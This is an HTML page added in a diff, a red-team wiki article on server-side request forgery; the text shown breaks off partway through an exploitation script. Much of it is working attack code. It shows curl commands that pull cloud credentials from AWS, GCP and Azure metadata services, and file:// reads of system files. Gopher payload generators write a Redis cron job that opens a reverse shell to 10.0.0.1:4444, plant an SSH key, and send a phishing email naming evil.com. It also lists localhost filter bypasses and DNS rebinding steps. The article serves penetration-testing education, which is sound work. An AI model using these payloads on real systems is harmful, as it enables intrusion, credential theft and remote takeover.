@@ -1,0 +1,1169 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>SSRF | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="SSRF">
+		<meta name="keywords" content="cloud, metadata, protocol-smuggling, rce, redis, redteam, ssrf">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="SSRF">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Server-Side Request Forgery - forcing a server to make requests to internal services, cloud metadata, and databases">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/ssrf.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="SSRF">
+		<meta name="twitter:description" itemprop="description" content="Server-Side Request Forgery - forcing a server to make requests to internal services, cloud metadata, and databases">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-core-mechanic">The Core Mechanic</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-ssrf-parameter-names">Common SSRF Parameter Names</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#finding-ssrf-in-parameters">Finding SSRF in Parameters</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#internal-service-targets">Internal Service Targets</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#cloud-metadata-endpoints">Cloud Metadata Endpoints</a></b>
+					<ul>
+						<li><a href="#aws-imds-exploitation">AWS IMDS Exploitation</a></li>
+						<li><a href="#gcp-metadata-exploitation">GCP Metadata Exploitation</a></li>
+						<li><a href="#azure-metadata">Azure Metadata</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#protocol-smuggling-via-ssrf">Protocol Smuggling via SSRF</a></b>
+					<ul>
+						<li><a href="#file">file://</a></li>
+						<li><a href="#gopher-tcp-protocol-smuggling">gopher:// (TCP Protocol Smuggling)</a></li>
+						<li><a href="#gopher-to-redis-cron-job-rce">Gopher to Redis - Cron Job RCE</a></li>
+						<li><a href="#gopher-to-redis-ssh-authorized-keys">Gopher to Redis - SSH Authorized Keys</a></li>
+						<li><a href="#gopher-to-mysql">Gopher to MySQL</a></li>
+						<li><a href="#gopher-to-smtp-internal-email">Gopher to SMTP - Internal Email</a></li>
+						<li><a href="#dict-port-scanning">dict:// (Port Scanning)</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ssrf-bypass-techniques">SSRF Bypass Techniques</a></b>
+					<ul>
+						<li><a href="#localhost-bypass">Localhost Bypass</a></li>
+						<li><a href="#conversion-reference">Conversion reference</a></li>
+						<li><a href="#url-parser-inconsistency-bypass">URL Parser Inconsistency Bypass</a></li>
+						<li><a href="#dns-rebinding">DNS Rebinding</a></li>
+						<li><a href="#open-redirect-as-ssrf-bridge">Open Redirect as SSRF Bridge</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#custom-ssrf-exploitation-script">Custom SSRF Exploitation Script</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#blind-ssrf">Blind SSRF</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ssrf-rce-chains">SSRF -> RCE Chains</a></b>
+					<ul>
+						<li><a href="#ssrf-redis-system-command">SSRF -> Redis -> System Command</a></li>
+						<li><a href="#ssrf-elasticsearch-rce">SSRF -> Elasticsearch RCE</a></li>
+						<li><a href="#ssrf-docker-api-host-root">SSRF -> Docker API -> Host Root</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#fixes">Fixes</a></b>
+					<ul>
+						<li><a href="#python-fix-example-requests">Python fix example (requests)</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/ssrf.html">Ssrf</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="ssrf">SSRF</h2>
+					<p>
+						Server-Side Request Forgery - forcing a server to make requests to internal services, cloud
+						metadata, and databases
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							<abbr title="Server-Side Request Forgery">SSRF</abbr>
+							makes a server issue a request the attacker cannot make
+							directly, reaching internal services and cloud metadata endpoints. This article shows how to
+							find injectable parameters, abuse the
+							<code>file://</code>
+							,
+							<code>gopher://</code>
+							, and
+							<code>dict://</code>
+							schemes, bypass
+							localhost filters, and chain the flaw into Redis, Elasticsearch, and Docker
+							<abbr title="Application Programming Interface">API</abbr>
+							compromise. By the end you can test an
+							<abbr title="Server-Side Request Forgery">SSRF</abbr>
+							endpoint and choose
+							the right mitigation.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/http.html">HTTP</a> - protocol, methods, headers, redirect behavior, <abbr title="Uniform Resource Locator">URL</abbr> structure</li>
+							<li><a href="/wiki/articles/fundamentals/dns.html">DNS</a> - resolution, internal zones, split-horizon <abbr title="Domain Name System">DNS</abbr> , reverse lookup</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="the-core-mechanic">The Core Mechanic</h3>
+						<p>
+							A server accepts a
+							<abbr title="Uniform Resource Locator">URL</abbr>
+							from the user and makes an
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							request to it. The server's network position - behind the firewall, on the internal network,
+							in the cloud - gives it access that the attacker does not have directly.
+						</p>
+						<pre class="plaintext">
+Attacker → [SSRF Parameter] → Web Server → [Internal Network Request] → Target
+                                                      ↑
+                                              Trusted Position
+                                              (bypasses firewall)
+						</pre>
+						<p>The vulnerability pattern is always the same:</p>
+						<pre class="python">
+# Vulnerable pattern
+import requests
+url = request.args.get(&#39;url&#39;)
+response = requests.get(url)
+return response.text
+
+# Vulnerable pattern with file download
+import urllib.request
+image_url = request.form.get(&#39;image_url&#39;)
+urllib.request.urlretrieve(image_url, &#39;/var/www/uploads/avatar.png&#39;)
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-ssrf-parameter-names">Common SSRF Parameter Names</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Parameter</th>
+									<th align="center">Typical Usage</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>url</code>,<code>uri</code>,<code>link</code>,<code>href</code></td>
+									<td align="center">Generic URL fetching</td>
+								</tr>
+								<tr>
+									<td align="center"><code>path</code>,<code>filepath</code>,<code>file</code></td>
+									<td align="center">File path specification</td>
+								</tr>
+								<tr>
+									<td align="center"><code>redirect</code>,<code>redirect_uri</code>,<code>callback</code></td>
+									<td align="center">OAuth redirects</td>
+								</tr>
+								<tr>
+									<td align="center"><code>proxy</code>,<code>proxy_url</code></td>
+									<td align="center">Forward proxy configuration</td>
+								</tr>
+								<tr>
+									<td align="center"><code>image</code>,<code>image_url</code>,<code>img</code>,<code>src</code></td>
+									<td align="center">Image URL fetching</td>
+								</tr>
+								<tr>
+									<td align="center"><code>feed</code>,<code>rss</code>,<code>atom</code></td>
+									<td align="center">Feed aggregators</td>
+								</tr>
+								<tr>
+									<td align="center"><code>host</code>,<code>domain</code>,<code>endpoint</code></td>
+									<td align="center">Service configuration</td>
+								</tr>
+								<tr>
+									<td align="center"><code>webhook</code>,<code>callback_url</code>,<code>notify_url</code></td>
+									<td align="center">Webhook registration</td>
+								</tr>
+								<tr>
+									<td align="center"><code>upload</code>,<code>download</code>,<code>fetch</code></td>
+									<td align="center">File transfer</td>
+								</tr>
+								<tr>
+									<td align="center"><code>api_url</code>,<code>base_url</code>,<code>service_url</code></td>
+									<td align="center">API configuration</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="finding-ssrf-in-parameters">Finding SSRF in Parameters</h3>
+						<pre class="bash">
+# Send a collaborator URL in every parameter and watch DNS/HTTP
+for param in url path redirect proxy image feed webhook callback; do
+    curl -X POST &#34;http://target/api&#34; \
+      -d &#34;${param}=http://YOUR_COLLABORATOR/ssrf_test&amp;other=data&#34; \
+      -w &#34;\n${param}&#34; -o /dev/null -s
+done
+						</pre>
+					</section>
+					<section>
+						<h3 id="internal-service-targets">Internal Service Targets</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Service</th>
+									<th align="center">Default Port</th>
+									<th align="center">Impact</th>
+									<th align="center">SSRF -> RCE Path</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">HTTP web apps</td>
+									<td align="center">80, 443, 8080, 8443</td>
+									<td align="center">Read internal data, admin panels</td>
+									<td align="center">Upload webshell via admin</td>
+								</tr>
+								<tr>
+									<td align="center">Redis</td>
+									<td align="center">6379</td>
+									<td align="center">Data access, RCE</td>
+									<td align="center">Write SSH key / cron job</td>
+								</tr>
+								<tr>
+									<td align="center">Memcached</td>
+									<td align="center">11211</td>
+									<td align="center">Data leak, cache poisoning</td>
+									<td align="center">Data manipulation</td>
+								</tr>
+								<tr>
+									<td align="center">MySQL</td>
+									<td align="center">3306</td>
+									<td align="center">Database access</td>
+									<td align="center">Extract data, write files</td>
+								</tr>
+								<tr>
+									<td align="center">PostgreSQL</td>
+									<td align="center">5432</td>
+									<td align="center">Database access</td>
+									<td align="center">Extract data, write files</td>
+								</tr>
+								<tr>
+									<td align="center">MongoDB</td>
+									<td align="center">27017</td>
+									<td align="center">Document database access</td>
+									<td align="center">Data exfiltration</td>
+								</tr>
+								<tr>
+									<td align="center">Elasticsearch</td>
+									<td align="center">9200</td>
+									<td align="center">Full data access</td>
+									<td align="center">Document manipulation, RCE via scripting</td>
+								</tr>
+								<tr>
+									<td align="center">Solr</td>
+									<td align="center">8983</td>
+									<td align="center">Search index access</td>
+									<td align="center">RCE via Velocity template</td>
+								</tr>
+								<tr>
+									<td align="center">Docker API</td>
+									<td align="center">2375, 2376</td>
+									<td align="center">Container control</td>
+									<td align="center">Create privileged container -> host RCE</td>
+								</tr>
+								<tr>
+									<td align="center">Kubernetes API</td>
+									<td align="center">6443, 10250</td>
+									<td align="center">Cluster control</td>
+									<td align="center">Pod creation, secret access</td>
+								</tr>
+								<tr>
+									<td align="center">etcd</td>
+									<td align="center">2379, 2380</td>
+									<td align="center">Cluster configuration</td>
+									<td align="center">Credential theft</td>
+								</tr>
+								<tr>
+									<td align="center">Consul</td>
+									<td align="center">8500</td>
+									<td align="center">Service discovery</td>
+									<td align="center">Configuration manipulation</td>
+								</tr>
+								<tr>
+									<td align="center">Apache Hadoop / YARN</td>
+									<td align="center">8088</td>
+									<td align="center">Cluster management</td>
+									<td align="center">Job submission -> RCE</td>
+								</tr>
+								<tr>
+									<td align="center">Jenkins</td>
+									<td align="center">8080</td>
+									<td align="center">CI/CD</td>
+									<td align="center">Groovy script -> RCE</td>
+								</tr>
+								<tr>
+									<td align="center">SMTP</td>
+									<td align="center">25, 587</td>
+									<td align="center">Email access</td>
+									<td align="center">Internal email exfiltration</td>
+								</tr>
+								<tr>
+									<td align="center">FTP</td>
+									<td align="center">21</td>
+									<td align="center">File access</td>
+									<td align="center">Internal file theft</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="cloud-metadata-endpoints">Cloud Metadata Endpoints</h3>
+						<p>
+							Cloud providers expose instance metadata via a link-local
+							<abbr title="Internet Protocol">IP</abbr>
+							address. These
+							endpoints are accessible only from the instance itself - making
+							<abbr title="Server-Side Request Forgery">SSRF</abbr>
+							the primary attack vector.
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Cloud Provider</th>
+									<th align="center">Metadata URL</th>
+									<th align="center">IMDS Version</th>
+									<th align="center">Header Required</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">AWS</td>
+									<td align="center"><code>http://169.254.169.254/latest/meta-data/</code></td>
+									<td align="center">v1 & v2</td>
+									<td align="center">Token for v2:<code>X-aws-ec2-metadata-token</code></td>
+								</tr>
+								<tr>
+									<td align="center">Google Cloud</td>
+									<td align="center"><code>http://169.254.169.254/computeMetadata/v1/</code></td>
+									<td align="center">v1</td>
+									<td align="center"><code>Metadata-Flavor: Google</code></td>
+								</tr>
+								<tr>
+									<td align="center">Azure</td>
+									<td align="center"><code>http://169.254.169.254/metadata/instance</code></td>
+									<td align="center">v1</td>
+									<td align="center"><code>Metadata: true</code></td>
+								</tr>
+								<tr>
+									<td align="center">DigitalOcean</td>
+									<td align="center"><code>http://169.254.169.254/metadata/v1/</code></td>
+									<td align="center">v1</td>
+									<td align="center">None</td>
+								</tr>
+								<tr>
+									<td align="center">Alibaba Cloud</td>
+									<td align="center"><code>http://100.100.100.200/latest/meta-data/</code></td>
+									<td align="center">v1</td>
+									<td align="center">None</td>
+								</tr>
+								<tr>
+									<td align="center">OpenStack</td>
+									<td align="center"><code>http://169.254.169.254/openstack/latest/meta_data.json</code></td>
+									<td align="center">v1</td>
+									<td align="center">None</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="aws-imds-exploitation">AWS IMDS Exploitation</h4>
+						<pre class="bash">
+# AWS IMDSv1 (no token required)
+curl http://169.254.169.254/latest/meta-data/
+
+# IAM credentials for the instance role
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Specific role credentials
+ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}
+
+# User data (often contains bootstrap scripts with secrets)
+curl http://169.254.169.254/latest/user-data/
+
+# AWS IMDSv2 (requires token — harder via SSRF but not impossible with redirects)
+TOKEN=$(curl -X PUT -H &#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34; \
+  http://169.254.169.254/latest/api/token)
+curl -H &#34;X-aws-ec2-metadata-token: $TOKEN&#34; \
+  http://169.254.169.254/latest/meta-data/
+						</pre>
+						<h4 id="gcp-metadata-exploitation">GCP Metadata Exploitation</h4>
+						<pre class="bash">
+# GCP — requires Metadata-Flavor header
+curl -H &#34;Metadata-Flavor: Google&#34; \
+  &#34;http://169.254.169.254/computeMetadata/v1/&#34;
+
+# Service account token
+curl -H &#34;Metadata-Flavor: Google&#34; \
+  &#34;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token&#34;
+
+# Custom metadata (often has API keys, database passwords)
+curl -H &#34;Metadata-Flavor: Google&#34; \
+  &#34;http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true&#34;
+
+# SSH keys
+curl -H &#34;Metadata-Flavor: Google&#34; \
+  &#34;http://169.254.169.254/computeMetadata/v1/instance/attributes/ssh-keys&#34; \
+  | base64 -d
+						</pre>
+						<h4 id="azure-metadata">Azure Metadata</h4>
+						<pre class="bash">
+# Azure — requires Metadata:true header
+curl -H &#34;Metadata:true&#34; \
+  &#34;http://169.254.169.254/metadata/instance?api-version=2021-02-01&#34;
+						</pre>
+					</section>
+					<section>
+						<h3 id="protocol-smuggling-via-ssrf">Protocol Smuggling via SSRF</h3>
+						<p>
+							Most
+							<abbr title="Server-Side Request Forgery">SSRF</abbr>
+							-capable libraries support multiple
+							<abbr title="Uniform Resource Locator">URL</abbr>
+							schemes. Each scheme opens a different attack surface.
+						</p>
+						<h4 id="file">file://</h4>
+						<p>Read local files:</p>
+						<pre class="bash">
+curl &#34;http://target/ssrf?url=file:///etc/passwd&#34;
+curl &#34;http://target/ssrf?url=file:///proc/self/environ&#34;
+curl &#34;http://target/ssrf?url=file:///proc/1/cmdline&#34;
+						</pre>
+						<p>
+							In Java,
+							<code>file://</code>
+							can list directories:
+						</p>
+						<pre class="bash">
+curl &#34;http://target/ssrf?url=file:///etc/&#34;     # Java: returns directory listing
+curl &#34;http://target/ssrf?url=file:///var/www/&#34;  # Web root enumeration
+						</pre>
+						<h4 id="gopher-tcp-protocol-smuggling">gopher:// (TCP Protocol Smuggling)</h4>
+						<p>
+							The
+							<code>gopher://</code>
+							scheme opens a raw
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							connection and sends
+							arbitrary bytes. This allows interacting with any
+							<abbr title="Transmission Control Protocol">TCP</abbr>
+							-based
+							service through
+							<abbr title="Server-Side Request Forgery">SSRF</abbr>
+							.
+						</p>
+						<p>
+							The format:
+							<code>gopher://HOST:PORT/_DATA</code>
+							- the
+							<code>_</code>
+							is a placeholder for the gopher item type,
+							and
+							<code>DATA</code>
+							is
+							<abbr title="Uniform Resource Locator">URL</abbr>
+							-encoded raw bytes sent to the socket.
+						</p>
+						<pre class="plaintext">
+gopher://127.0.0.1:6379/_DATA
+						</pre>
+						<h4 id="gopher-to-redis-cron-job-rce">Gopher to Redis - Cron Job RCE</h4>
+						<pre class="python">
+import urllib.parse
+
+# Redis commands to write a cron job that calls back
+redis_commands = [
+    &#34;FLUSHALL&#34;,
+    &#34;SET mykey \&#34;\n\n*/1 * * * * /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#39;\n\n\&#34;&#34;,
+    &#34;CONFIG SET dir /var/spool/cron/crontabs&#34;,
+    &#34;CONFIG SET dbfilename root&#34;,
+    &#34;SAVE&#34;,
+    &#34;QUIT&#34;
+]
+
+payload = &#34;\r\n&#34;.join(redis_commands)
+encoded = urllib.parse.quote(payload)
+
+gopher_url = f&#34;gopher://127.0.0.1:6379/_{encoded}&#34;
+print(gopher_url)
+# Send this as the SSRF URL parameter
+						</pre>
+						<h4 id="gopher-to-redis-ssh-authorized-keys">Gopher to Redis - SSH Authorized Keys</h4>
+						<p>
+							The same technique, but write to
+							<code>~/.ssh/authorized_keys</code>
+							:
+						</p>
+						<pre class="python">
+import urllib.parse
+
+ssh_pubkey = &#34;ssh-rsa AAAAB3NzaC1yc2EAAA... attacker@kali&#34;  # Your pubkey
+
+redis_commands = [
+    &#34;FLUSHALL&#34;,
+    f&#39;SET sshkey &#34;\n\n{ssh_pubkey}\n\n&#34;&#39;,
+    &#34;CONFIG SET dir /root/.ssh&#34;,
+    &#34;CONFIG SET dbfilename authorized_keys&#34;,
+    &#34;SAVE&#34;,
+    &#34;QUIT&#34;
+]
+
+payload = &#34;\r\n&#34;.join(redis_commands)
+encoded = urllib.parse.quote(payload)
+print(f&#34;gopher://127.0.0.1:6379/_{encoded}&#34;)
+						</pre>
+						<h4 id="gopher-to-mysql">Gopher to MySQL</h4>
+						<p>
+							Although My
+							<abbr title="Structured Query Language">SQL</abbr>
+							has its own binary protocol, you can cause a denial
+							of service or probe for version info:
+						</p>
+						<pre class="python">
+# Send MySQL &#34;greeting&#34; probe
+gopher_url = f&#34;gopher://127.0.0.1:3306/_{urllib.parse.quote(chr(0x0a))}&#34;
+# The server will respond with its protocol greeting
+						</pre>
+						<h4 id="gopher-to-smtp-internal-email">Gopher to SMTP - Internal Email</h4>
+						<pre class="python">
+import urllib.parse
+
+mail_commands = [
+    &#34;HELO localhost&#34;,
+    &#34;MAIL FROM: &lt;attacker@evil.com&gt;&#34;,
+    &#34;RCPT TO: &lt;admin@internal.corp&gt;&#34;,
+    &#34;DATA&#34;,
+    &#34;Subject: Urgent Security Patch&#34;,
+    &#34;&#34;,
+    &#34;Click this link: http://evil.com/phish&#34;,
+    &#34;.&#34;,
+    &#34;QUIT&#34;
+]
+
+payload = &#34;\r\n&#34;.join(mail_commands)
+encoded = urllib.parse.quote(payload)
+print(f&#34;gopher://127.0.0.1:25/_{encoded}&#34;)
+						</pre>
+						<h4 id="dict-port-scanning">dict:// (Port Scanning)</h4>
+						<p>
+							The
+							<code>dict://</code>
+							protocol connects to a dictionary server. Against non-dict services, it reveals
+							whether a port is open or closed based on connection time:
+						</p>
+						<pre class="bash">
+# dict protocol sends &#34;CLIENT libcurl\n&#34; and reads response
+curl -s &#34;http://target/ssrf?url=dict://127.0.0.1:22&#34;
+# Open (SSH responds): &#34;SSH-2.0-OpenSSH_8.9p1&#34;
+# Open (HTTP responds): &#34;HTTP/1.1 400 Bad Request&#34;
+# Closed: connection refused or timeout
+						</pre>
+						<p>
+							Automated port scan through
+							<abbr title="Server-Side Request Forgery">SSRF</abbr>
+							:
+						</p>
+						<pre class="python">
+import requests
+import time
+
+target_ssrf = &#34;http://target/app?url={}&#34;
+ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017, 2375]
+
+for port in ports:
+    start = time.time()
+    try:
+        r = requests.get(target_ssrf.format(f&#34;dict://127.0.0.1:{port}&#34;), timeout=3)
+        elapsed = time.time() - start
+        print(f&#34;Port {port}: OPEN ({elapsed:.2f}s) — {len(r.text)} bytes&#34;)
+    except requests.exceptions.Timeout:
+        print(f&#34;Port {port}: FILTERED/TIMEOUT&#34;)
+    except Exception as e:
+        print(f&#34;Port {port}: CLOSED — {e}&#34;)
+						</pre>
+					</section>
+					<section>
+						<h3 id="ssrf-bypass-techniques">SSRF Bypass Techniques</h3>
+						<h4 id="localhost-bypass">Localhost Bypass</h4>
+						<p>When the application blacklists "localhost" or "127.0.0.1":</p>
+						<pre class="bash">
+# Decimal IP notation
+http://2130706433/          # 127.0.0.1 as decimal
+http://2852039166/          # 169.254.169.254 as decimal
+
+# Hexadecimal IP notation
+http://0x7F000001/          # 127.0.0.1 as hex
+http://0x7F.0.0.1/          # Mixed notation
+http://0xA9FEA9FE/          # 169.254.169.254 as hex
+
+# Octal IP notation
+http://0177.0.0.1/          # 127 in octal
+http://0177.00.00.01/       # Full octal
+
+# IPv6 loopback
+http://[::1]/
+http://[::ffff:127.0.0.1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+
+# DNS-based bypass
+http://localhost.domain.com/        # External DNS pointing to 127.0.0.1
+http://127.0.0.1.nip.io/            # nip.io resolves to 127.0.0.1
+http://localtest.me/                # Resolves to 127.0.0.1 (historically)
+http://127.1/                        # Short form: Linux treats 127.1 as 127.0.0.1
+http://0.0.0.0/                      # &#34;All interfaces&#34; — binds to all, may hit services
+http://0/                            # Linux treats 0 as 0.0.0.0
+
+# Alternative loopback
+http://127.127.127.127/
+http://127.0.1.3/
+
+# Case variation and encoding
+http://LOCALHOST/
+http://127.0.0.1%00@evil.com/        # Null byte terminator
+http://⑫⑦。⓪。⓪。①/                    # Fullwidth characters (if decoded)
+http://2130706433.xip.io/             # Decimal + xip.io
+
+# Redirections
+http://redirect-service.com/redirect?to=http://127.0.0.1/
+						</pre>
+						<h4 id="conversion-reference">Conversion reference</h4>
+						<pre class="python">
+import ipaddress
+import struct
+import socket
+
+def ip_to_decimal(ip):
+    return int.from_bytes(socket.inet_aton(ip), &#39;big&#39;)
+
+def ip_to_hex(ip):
+    return hex(ip_to_decimal(ip))
+
+print(ip_to_decimal(&#39;127.0.0.1&#39;))        # 2130706433
+print(ip_to_decimal(&#39;169.254.169.254&#39;))  # 2852039166
+print(ip_to_hex(&#39;127.0.0.1&#39;))            # 0x7f000001
+						</pre>
+						<h4 id="url-parser-inconsistency-bypass">URL Parser Inconsistency Bypass</h4>
+						<p>
+							Different libraries parse
+							<abbr title="Uniform Resource Locator">URL</abbr>
+							s differently. Exploit the disagreement
+							between validation and request:
+						</p>
+						<pre class="bash">
+# The validator sees &#34;example.com&#34;, the requester connects to localhost
+http://example.com@127.0.0.1/
+http://example.com:80@127.0.0.1/
+http://127.0.0.1:80@example.com/         # Some parsers take 127.0.0.1 as auth
+
+# Fragment confusion
+http://example.com#@127.0.0.1/
+http://127.0.0.1#@example.com/
+
+# Double URL encoding
+http://127.0.0.1%2f@example.com/         # %2f = /
+http://localhost%252f@example.com/        # Double-encoded /
+
+# Query string embedding
+http://example.com/?url=http://127.0.0.1/
+http://example.com?x=http://127.0.0.1/admin
+						</pre>
+						<h4 id="dns-rebinding">DNS Rebinding</h4>
+						<p>
+							Register a domain whose
+							<abbr title="Domain Name System">DNS</abbr>
+							record changes after validation. The validator
+							resolves it and sees a safe
+							<abbr title="Internet Protocol">IP</abbr>
+							. The actual request resolves it again and
+							gets the internal
+							<abbr title="Internet Protocol">IP</abbr>
+							.
+						</p>
+						<pre class="bash">
+# Tools: rbndr, singularity, dnsrebind.net
+
+# 1. Use a rebinding service
+# Configure: 1.2.3.4.example.com → initially resolves to 1.2.3.4 (your IP)
+#            After TTL:          → resolves to 127.0.0.1
+
+# 2. Self-hosted DNS rebinding with dnschef
+dnschef --fakeip 127.0.0.1 --fakedomains rebind.local
+
+# 3. Exploit with TOCTOU race
+# Send rapid parallel requests hoping some resolve before, some after rebind
+for i in $(seq 1 100); do
+    curl &#34;http://target/ssrf?url=http://rebind.local/admin&#34; &amp;
+done
+						</pre>
+						<h4 id="open-redirect-as-ssrf-bridge">Open Redirect as SSRF Bridge</h4>
+						<p>
+							If direct
+							<abbr title="Server-Side Request Forgery">SSRF</abbr>
+							is filtered but there's an open redirect:
+						</p>
+						<pre class="plaintext">
+SSRF URL: http://target/open-redirect?redirect=http://169.254.169.254/
+						</pre>
+					</section>
+					<section>
+						<h3 id="custom-ssrf-exploitation-script">Custom SSRF Exploitation Script</h3>
+						<p>
+							A comprehensive Python script for
+							<abbr title="Server-Side Request Forgery">SSRF</abbr>
+							testing:
+						</p>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;
+SSRF exploitation toolkit.
+Tests multiple bypass techniques against a target SSRF endpoint.
+&#34;&#34;&#34;
+
+import requests
+import urllib.parse
+import sys
+import time
+import socket
+import struct
+import argparse
+from concurrent.futures import ThreadPoolExecutor
+
+BURP_COLLAB = &#34;YOUR_COLLABORATOR.burpcollaborator.net&#34;
+
+def ip_to_decimal(ip):
+    return struct.unpack(&#34;!I&#34;, socket.inet_aton(ip))[0]
+
+def ip_to_hex(ip):
+    return hex(ip_to_decimal(ip))
+
+def build_localhost_bypasses():
+    &#34;&#34;&#34;Generate all localhost variants.&#34;&#34;&#34;
+    return [
+        &#34;http://127.0.0.1&#34;,
+        &#34;http://127.1&#34;,
+        &#34;http://localhost&#34;,
+        &#34;http://0.0.0.0&#34;,
+        &#34;http://0&#34;,
+        &#34;http://[::1]&#34;,
+        &#34;http://[::ffff:127.0.0.1]&#34;,
+        f&#34;http://{ip_to_decimal(&#39;127.0.0.1&#39;)}&#34;,
+        f&#34;http://{ip_to_hex(&#39;127.0.0.1&#39;)}&#34;,
+        &#34;http://0177.0.0.1&#34;,
+        &#34;http://0177.00.00.01&#34;,
+        &#34;http://127.127.127.127&#34;,
+        &#34;http://2130706433&#34;,
+        &#34;http://0x7f.0.0.1&#34;,
+        &#34;http://127.0.0.1.nip.io&#34;,
+        &#34;http://localtest.me&#34;,
+        &#34;http://127.0.0.1%00.example.com&#34;,
+        &#34;http://example.com@127.0.0.1&#34;,
+        &#34;http://127.0.0.1:80@example.com&#34;,
+        &#34;http://example.com#@127.0.0.1&#34;,
+    ]
+
+def build_metadata_urls():
+    &#34;&#34;&#34;Cloud metadata endpoints.&#34;&#34;&#34;
+    metadata = {
+        &#34;aws&#34;: [&#34;http://169.254.169.254/latest/meta-data/&#34;,
+                f&#34;http://{ip_to_decimal(&#39;169.254.169.254&#39;)}/latest/meta-data/&#34;],
+        &#34;gcp&#34;: [&#34;http://169.254.169.254/computeMetadata/v1/instance/&#34;],
+        &#34;azure&#34;: [&#34;http://169.254.169.254/metadata/instance&#34;],
+        &#34;digitalocean&#34;: [&#34;http://169.254.169.254/metadata/v1/&#34;],
+        &#34;alibaba&#34;: [&#34;http://100.100.100.200/latest/meta-data/&#34;],
+    }
+    return metadata
+
+def test_parameter_ssrf(target_url, param_name, bypass_list, method=&#39;GET&#39;):
+    &#34;&#34;&#34;Test each bypass URL against a specific parameter.&#34;&#34;&#34;
+    results = []
+    for bypass_url in bypass_list:
+        try:
+            if method == &#39;GET&#39;:
